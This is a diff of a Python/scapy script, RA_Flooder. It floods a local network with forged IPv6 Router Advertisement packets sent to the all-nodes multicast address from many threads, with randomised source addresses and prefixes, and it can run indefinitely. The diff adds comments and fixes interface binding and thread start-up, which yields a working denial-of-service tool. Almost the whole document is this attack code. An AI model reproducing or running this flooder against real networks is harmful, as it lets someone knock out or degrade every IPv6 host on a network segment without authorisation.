@@ -1,9 +1,7 @@
 #! /usr/bin/python2
-
-from scapy.all import *
-import random
-import sys
-import threading
+from scapy.all import * #required for packet crafting
+import random	#generates mac, ipv6 address
+import threading #for multithreading
 import sys
 
 try:
@@ -16,14 +14,14 @@ class RA_Flooder (threading.Thread): #worker class for threading
     def __init__(self, counter=0):
 		threading.Thread.__init__(self)
 		self.iface = sys.argv[1]
-		self.counter = counter
+		self.counter = counter 
 
     def prefix_pack(self): #build the actual packet
-		self.pkt = ICMPv6NDOptPrefixInfo()
+		self.pkt = ICMPv6NDOptPrefixInfo() 
 		self.pkt.prefixlen = 64
-			#self.pkt.prefix = "cc5f::"
+		#self.pkt.prefix = "cc5f::"          #use for broadcast address instead of random prefix
 		self.pkt.prefix = self.prefix_rand() #randomize prefix
-		#self.pkt.show()
+		#self.pkt.show() #debug
 		return self.pkt
 
     def ipv6_rand(self): #generate random ipv6 address
@@ -40,7 +38,7 @@ class RA_Flooder (threading.Thread): #worker class for threading
 
     def packet_gen(self):
         #build the actual packet in scapy
-        self.a = IPv6()
+        self.a = IPv6()	#set as an IPv6 packet
         self.a.dst = "ff02::1" #dst is set to broadcast
         self.a.src = self.ipv6_rand() #the source is randomized
         self.a.nh = 58
@@ -62,10 +60,10 @@ class RA_Flooder (threading.Thread): #worker class for threading
         return self.pk
 
     def run(self):
-        self.s = conf.L3socket()#iface=self.iface) #use correct interface
+        self.s = conf.L3socket(iface=self.iface) #use correct interface
         if self.counter is 0: #if the counter is zero, continue forever
             while True:
-                self.pkt = self.packet_gen()
+                self.pkt = self.packet_gen() #create a packet as fast as possible, sned it
                 self.s.send(self.pkt)
         else: #otherwise, use until packet count (per thread) has been met
             for x in range(self.counter):
@@ -73,13 +71,12 @@ class RA_Flooder (threading.Thread): #worker class for threading
                 self.s.send(self.pkt)
         print '[*] Finished sending'
 
-threadLock = threading.Lock()
-threads = []
-
+threadLock = threading.Lock() 
+threads = [] #store all threads
 for x in range(0, int(sys.argv[2])): #create threads
-    t = RA_Flooder(int(sys.argv[3]))
-    threads.append(t)
-    print '[+] Thread started ' + str(x)
-    t.start()
-
+    t = RA_Flooder(int(sys.argv[3])) #create thread with correct variables
+    threads.append(t) #add thread to array
+for t in threads:
+    t.start() #start thread
+    print '[+] Thread started ' + str(x) 
 print 'All threads started'
